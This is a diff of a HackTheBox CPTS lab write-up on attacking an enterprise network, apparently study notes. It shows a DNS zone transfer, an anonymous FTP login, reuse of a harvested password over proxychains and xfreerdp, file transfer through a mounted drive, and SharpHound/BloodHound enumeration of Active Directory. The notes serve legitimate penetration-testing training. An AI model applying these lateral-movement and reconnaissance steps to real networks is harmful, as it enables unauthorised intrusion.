@@ -8,7 +8,7 @@ Attacking Enterprise Networks is the final module for the HackTheBox Certified P
 
 ### First Flag:
 
-The first flag was found using the following command:
+The first flag was found using the following dig command to request a DNS zone transfer from the target ip:
 
 ```sh
 dig axfr inlanefreight.local @10.129.229.147
@@ -45,7 +45,7 @@ We additionally get monitoring.inlanefreight.local as a subdomain.
 
 ### Second Flag:
 
-Found using an FTP anonymous login:
+The second flag was found by attempting an FTP login using the default anonymous credential:
 
 ```sh
 ftp anonymous@ip
@@ -608,7 +608,7 @@ Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Wh
 C:\Users\Administrator\Desktop
 C:\Share
 ```
-After a long journey, we finally get the 15th flag from C:\Users\Administrator\Desktop:
+Then, we finally get the 15th flag from C:\Users\Administrator\Desktop:
 ```
 K33p_0n_sp00fing!
 ```
@@ -637,4 +637,30 @@ dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
 ```
 Where we can see hporter:Gr8hambino!
 
-These credentials may be for a domain user. 
+These credentials work with xfreerdp:
+```
+proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino!
+```
+and we see a screen with a black wallpaper and the bash terminal open.
+
+We see that the command "net user /dom" grants us an output of all of the users in the domain, so we know that the hporter is a domain user account.
+
+We can exit out of the current xfreerdp session and connect our attack box's drive by using the /drive command:
+```
+proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /drive:(drivename),"/home/(drivename)"
+```
+After this, we can cd into the C:\share directory and run the command "net use" to make our attack box's drive accessible. Now we can copy files from our drive using the copy command:
+```
+C:\Share copy \\TSCLIENT\home\file
+```
+Since we have a domain user account, we now can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation.
+```
+C:\Share> copy \\TSCLIENT\home\SharpHound.exe
+C:\Share> SharpHound.exe -c All
+```
+This creates a SharpHound zip file that I downloaded using EvilWin-RM's "download" command using the Administrator account. 
+If you have not downloaded BloodHound, there are steps on Github that may seem a bit complicated. I am on Ubuntu Linux, and the easiest way for me was to install Docker Desktop on my OS and have the container run on my localhost at port 8080. There, we can access our BloodHound instance and insert all of the files contained in the Sharphound zip file. For more information you can go to https://github.com/SpecterOps/BloodHound.
+
+
+
+
